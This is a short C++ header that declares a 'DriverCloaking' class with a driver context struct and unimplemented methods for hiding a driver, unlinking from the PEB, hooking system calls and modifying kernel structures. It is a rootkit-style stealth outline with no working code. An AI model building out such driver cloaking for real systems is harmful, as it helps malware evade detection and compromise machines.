#pragma once
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>

class DriverCloaking {
private:
    struct HiddenDriverContext {
        PVOID driverBase;
        SIZE_T driverSize;
        UNICODE_STRING driverPath;
        PVOID originalProcAddress;
    };

    HiddenDriverContext context;
    
public:
    bool InitializeHiding();
    bool CloakDriver();
    bool UnlinkFromPEB();
    bool HookSystemCalls();
    bool ModifyKernelStructures();
}; 